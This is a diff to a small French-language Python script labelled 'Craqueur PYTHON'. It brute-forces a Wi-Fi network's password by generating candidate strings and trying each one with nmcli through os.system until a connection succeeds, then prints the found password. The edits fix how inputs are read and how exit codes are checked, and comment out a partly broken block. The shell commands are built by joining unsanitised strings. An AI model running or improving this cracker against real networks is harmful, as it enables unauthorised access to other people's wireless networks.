@@ -1,9 +1,11 @@
-
+import os
 file = open("info.txt","r")
-nomwifi = file.read()
+c = file.read().split('\n')
+nomwifi = c[0]
 file.close()
 file = open("interface.txt","r")
-interface = file.read()
+c = file.read().split('\n')
+interface = c[0]
 file.close()
 print("Craqueur PYTHON")
 
@@ -57,18 +59,22 @@ else :
 			l = i.upper()
 			l6.append(l)
 		except :
-			print('')
+			print('l')
 	l7 = l6 + l5
 	lettre = list(set(l7))
+"""
 l = input("Quelle lettres veux tu enlever (lettre1_lettre2 ...) : "
-enlever = l.split('_')
-for i in enlever
+en = []
+en = str(l).split('_')
+for i in enlever :
 	if i in lettre :
 		liste = lettre.replace(i,'')
 		lettre = liste
+"""
 print(lettre)
 nombre = [-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
 i = True
+print('nmcli d wifi connect "' + str(nomwifi) + '" password '  + " ifname " + interface)
 while i :
 	nb = nombre[0]
 	nombre[0] = nb + 1
@@ -95,8 +101,12 @@ while i :
 		position = position + 1
 	mot = ''.join(final)
 	try :
-		os.system('nmcli d wifi connect "' + str(nomwifi) + '" password ' + str(mot) + " ifname " + interface)
-		i = False
+		j = os.system('nmcli d wifi connect "' + nomwifi + '" password ' + mot + " ifname " + interface )
+		print(j)
+		if j != 256 :
+			i = False
+		else :	
+			print(mot, end="\r")
 	except :
-		print(mot, end="\r")
+		print('')
 print('le mot de passe est : ' + mot )
